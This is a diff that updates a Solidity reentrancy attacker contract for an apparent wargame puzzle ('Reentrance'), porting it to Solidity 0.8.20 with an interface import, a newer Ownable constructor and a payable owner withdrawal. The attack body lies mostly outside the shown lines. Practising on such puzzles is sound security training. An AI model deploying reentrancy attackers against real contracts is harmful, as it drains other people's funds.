@@ -1,14 +1,14 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.6.12;
+pragma solidity ^0.8.20;
 
-import {Ownable} from "@openzeppelin3.3.0/contracts/access/Ownable.sol";
-import {Reentrance} from "../../puzzles/10/Reentrance.sol";
+import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
+import {IReentrance} from "@puzzles/10/IReentrance.sol";
 
 contract ReentrancyAttacker is Ownable {
-    Reentrance public puzzleContract;
+    IReentrance public puzzleContract;
 
-    constructor(address _reentrance) public {
-        puzzleContract = Reentrance(payable(_reentrance));
+    constructor(address _reentrance) Ownable(msg.sender) {
+        puzzleContract = IReentrance(payable(_reentrance));
     }
 
     receive() external payable {
@@ -23,6 +23,6 @@ contract ReentrancyAttacker is Ownable {
     }
 
     function withdraw() public onlyOwner {
-        msg.sender.transfer(address(this).balance);
+        payable(msg.sender).transfer(address(this).balance);
     }
 }
